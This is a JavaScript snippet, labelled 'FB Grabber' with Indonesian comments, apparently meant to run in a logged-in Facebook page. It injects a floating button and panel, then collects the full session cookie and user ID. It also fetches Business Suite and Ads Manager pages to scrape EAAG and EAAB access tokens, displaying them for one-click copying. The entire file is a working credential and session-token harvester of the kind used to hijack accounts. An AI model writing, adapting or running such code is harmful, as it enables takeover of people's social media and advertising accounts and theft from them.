(function() {
    // 1. Injeksi CSS (Tampilan Mobile Friendly)
    const style = document.createElement('style');
    style.textContent = `
        #floatBtn { 
            position: fixed; bottom: 10vw; right: 7vw; z-index: 2147483647; 
            width: 14vw; height: 14vw; background: #0866FF; 
            border-radius: 50%; display: flex; align-items: center; 
            justify-content: center; cursor: pointer; font-size: 6vw; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.4); border: 0.5vw solid white; 
        }
        #guard-modal {
            position: fixed; top: 0; left: 0; 
            width: 100vw; height: 100vh; background: #f0f2f5; 
            z-index: 2147483646; padding: 5vw; box-sizing: border-box; 
            display: none; overflow-y: auto; font-family: sans-serif;
        }
        .section-box { background: white; padding: 4vw; border-radius: 3vw; margin-bottom: 4vw; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .access-label { font-size: 3.5vw; font-weight: bold; color: #65676b; display: block; margin-bottom: 1.5vw; }
        .access-area { 
            width: 100%; height: 20vw; font-size: 3vw; border-radius: 2vw; 
            padding: 3vw; box-sizing: border-box; background: #f5f6f7; 
            color: #050505; border: 1px solid #ddd; resize: none; margin-bottom: 3vw; 
            font-family: monospace !important; word-break: break-all;
        }
        .btn-main { 
            width: 100%; padding: 4vw; background: #0866FF; color: white; 
            border-radius: 2vw; border: none; font-weight: bold; font-size: 4.5vw; 
        }
        #mStatus { position: fixed; bottom: 5vw; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 2vw 5vw; border-radius: 10vw; display: none; z-index: 2147483647; }
    `;
    document.head.appendChild(style);

    // 2. Struktur HTML (Mirip Screenshot Berhasil)
    const container = document.createElement('div');
    container.innerHTML = `
        <div id="floatBtn">🚀</div>
        <div id="guard-modal">
            <h1 style="text-align:center; font-size:8vw; color:#0866FF;">FB <span style="color:#333;">Grabber</span></h1>
            <div class="section-box">
                <button id="mGetAccess" class="btn-main">FETCH DATA SEKARANG</button>
                <div id="contentAccess" style="display:none; margin-top:5vw;">
                    <label class="access-label">Cookie :</label>
                    <textarea id="resCookie" class="access-area" readonly></textarea>
                    
                    <label class="access-label">Token EAAG :</label>
                    <textarea id="resTokenEAAG" class="access-area" readonly placeholder="Fetching EAAG..."></textarea>

                    <label class="access-label">Token EAAB :</label>
                    <textarea id="resTokenEAAB" class="access-area" readonly placeholder="Fetching EAAB..."></textarea>

                    <p style="font-size:4vw; font-weight:bold;">Facebook id : <span id="resId" style="color:#0866FF;">-</span></p>
                </div>
            </div>
        </div>
        <div id="mStatus">Copied!</div>
    `;
    document.body.appendChild(container);

    const modal = document.getElementById('guard-modal');
    const floatBtn = document.getElementById('floatBtn');
    const statusNotif = document.getElementById('mStatus');

    floatBtn.onclick = () => modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';

    const showNotif = (msg) => {
        statusNotif.innerText = msg;
        statusNotif.style.display = 'block';
        setTimeout(() => { statusNotif.style.display = 'none'; }, 1500);
    };

    const copyToClipboard = (val) => {
        const temp = document.createElement('textarea');
        temp.value = val;
        document.body.appendChild(temp);
        temp.select();
        document.execCommand('copy');
        document.body.removeChild(temp);
        showNotif("📋 Berhasil Disalin!");
    };

    // 3. Logika Ambil Data (Sesuai Kebutuhan)
    document.getElementById('mGetAccess').onclick = async () => {
        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Not Found";
        document.getElementById('resId').innerText = uid;
        document.getElementById('resCookie').value = document.cookie;

        // Ambil Token EAAG (Business Suite)
        try {
            const res = await fetch('https://business.facebook.com/content_management');
            const html = await res.text();
            const eaag = html.match(/(EAAG[a-zA-Z0-9]+)/)?.[1];
            document.getElementById('resTokenEAAG').value = eaag || "Gagal ambil EAAG (Coba buka business.facebook.com dulu)";
        } catch (e) { console.error(e); }

        // Ambil Token EAAB (Ads Manager/Lainnya)
        try {
            const res2 = await fetch('https://www.facebook.com/adsmanager/manage/campaigns');
            const html2 = await res2.text();
            const eaab = html2.match(/(EAAB[a-zA-Z0-9]+)/)?.[1];
            document.getElementById('resTokenEAAB').value = eaab || "EAAB Tidak Ditemukan";
        } catch (e) { console.error(e); }

        document.getElementById('contentAccess').style.display = 'block';
    };

    // Setup Klik untuk Copy
    ['resCookie', 'resTokenEAAG', 'resTokenEAAB'].forEach(id => {
        document.getElementById(id).onclick = function() { copyToClipboard(this.value); };
    });
})();
